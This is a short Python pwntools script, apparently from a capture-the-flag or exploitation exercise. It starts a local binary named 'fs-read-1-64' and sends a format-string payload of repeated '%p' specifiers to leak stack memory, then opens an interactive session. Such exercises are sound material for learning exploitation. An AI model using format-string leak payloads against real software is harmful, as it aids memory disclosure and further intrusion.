#!/usr/bin/env python

from pwn import *

p = process("./fs-read-1-64")

buf = "%p %p %p %p %p %p %p %p %p"

p.sendline(buf)

p.interactive()
